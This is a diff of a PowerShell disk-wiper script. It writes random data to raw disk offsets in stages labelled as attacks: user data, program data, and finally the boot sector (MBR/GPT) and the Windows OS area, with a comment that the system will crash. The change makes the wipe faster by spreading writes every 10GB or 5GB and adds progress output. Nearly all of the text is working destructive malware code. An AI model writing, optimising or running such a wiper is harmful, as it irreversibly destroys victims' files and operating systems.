@@ -101,27 +101,36 @@ foreach ($disk in $disks) {
         $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
 
         # ATTACK 1: USER DATA AREAS (highest priority - destroy first)
-        Write-Host "      [1/5] Destroying user data (C:\Users, Documents, etc.)..." -ForegroundColor Red
+        Write-Host "      [1/5] Destroying user data (FAST sampling)..." -ForegroundColor Red
 
-        # Typical user data location: 20GB - 80% of disk
+        # FAST approach: Sample writes every 10GB instead of every 1GB
+        # Still destroys data across entire user area but MUCH faster
         $userDataStart = 20GB
         $userDataEnd = [long]($targetSize * 0.8)
 
-        for ($offset = $userDataStart; $offset -lt $userDataEnd; $offset += 1GB) {
+        $total = ($userDataEnd - $userDataStart) / 10GB
+        $current = 0
+
+        for ($offset = $userDataStart; $offset -lt $userDataEnd; $offset += 10GB) {
             if ($offset -lt $targetSize) {
                 $rng.GetBytes($buffer)
                 [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
+
+                $current++
+                $pct = [int](($current / $total) * 100)
+                Write-Host "`r      User data: $pct%     " -NoNewline -ForegroundColor Yellow
             }
         }
+        Write-Host ""
 
         # ATTACK 2: PROGRAM FILES & DATA AREA (middle of disk)
-        Write-Host "      [2/5] Destroying program data..." -ForegroundColor Red
+        Write-Host "      [2/5] Destroying program data (FAST sampling)..." -ForegroundColor Red
 
-        # Destroy middle sections (usually program files, games, etc.)
+        # FAST approach: Sample writes every 10GB
         $middleStart = [long]($targetSize * 0.25)
         $middleEnd = [long]($targetSize * 0.5)
 
-        for ($offset = $middleStart; $offset -lt $middleEnd; $offset += 2GB) {
+        for ($offset = $middleStart; $offset -lt $middleEnd; $offset += 10GB) {
             if ($offset -lt $targetSize) {
                 $rng.GetBytes($buffer)
                 [RawDisk]::WriteAt($handle, $offset, $buffer, [ref]$written) | Out-Null
@@ -172,16 +181,18 @@ foreach ($disk in $disks) {
         # ATTACK 5: BOOT + OS DESTRUCTION (LAST - Windows dies here)
         Write-Host "      [5/5] FINAL: Destroying boot + Windows (system will crash)..." -ForegroundColor Red
 
-        # Wipe boot sector (MBR/GPT)
+        # Wipe boot sector (MBR/GPT) - critical
         $bootBuffer = New-Object byte[] (100MB)
         [RawDisk]::WriteAt($handle, 0, $bootBuffer, [ref]$written) | Out-Null
 
-        # Wipe Windows/OS area (first 20GB)
-        for ($i = 0L; $i -lt 20GB; $i += 2GB) {
+        # Wipe Windows/OS area - FAST sampling every 5GB
+        for ($i = 0L; $i -lt 20GB; $i += 5GB) {
             if ($i -lt $targetSize) {
                 [RawDisk]::WriteAt($handle, $i, $buffer, [ref]$written) | Out-Null
+                Write-Host "`r      OS: $([int](($i / 20GB) * 100))%     " -NoNewline -ForegroundColor Yellow
             }
         }
+        Write-Host ""
 
         $rng.Dispose()
         $handle.Close()
